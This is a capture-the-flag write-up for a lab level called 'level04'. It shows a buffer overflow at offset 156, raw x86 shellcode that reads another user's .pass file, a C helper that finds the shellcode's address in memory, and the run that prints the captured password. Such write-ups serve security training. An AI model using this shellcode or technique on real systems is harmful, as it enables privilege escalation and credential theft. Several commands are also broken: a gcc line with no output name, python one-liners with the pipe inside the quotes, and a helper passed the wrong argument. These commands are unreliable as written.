# level04

For this level, we have a program that is telling us `Give me some shellcode, k` and we can see that it create a child process and that we can make segfault the child process. 

With [gdb](gdbwriteup.md), we found that the buffer is at 156, so we will have to inject our shellcode after that.

```bash
python -c 'print("\x90" + "SHELLCODE ADDRESS") | ./level04'
```

We will create a shellcode that will read the file containing the flag, and we will use [this shellcode](http://shell-storm.org/shellcode/files/shellcode-73.html) to create it.

```bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```

Now, we will create a program to find the address of our shellcode.

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    if (argc == 2)    
        printf("%p\n", getenv(argv[1]));
    return (0);
}
```
We will need to compile it with the flag `-m32` to get the address in 32 bits.

```bash
gcc -m32 -o main.c
./getaddr $SHELLCODE
```

Now, we can run our exploit.

```bash
python -c 'print("\x90" * 156 + "SHELLCODE ADDRESS") | ./level04'
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```